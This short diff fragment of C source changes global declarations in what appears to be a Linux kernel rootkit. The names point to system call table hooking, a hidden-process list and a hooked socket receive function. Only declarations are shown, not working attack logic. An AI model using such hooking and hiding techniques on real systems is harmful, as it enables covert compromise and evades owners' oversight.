@@ -75,9 +75,10 @@ struct pid_list_node *pid_list_find(pid_t nr);
 /*
  * Global variables.
  */
+void **my_sct;
 void **sys_call_table;
-void *psct_fastcall;
-void *psct_slowpath;
+unsigned int *psct_fastcall;
+unsigned int *psct_slowpath;
 struct pid_list_node *pid_list_head;
 struct pid_list_node *pid_list_tail;
 int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags);
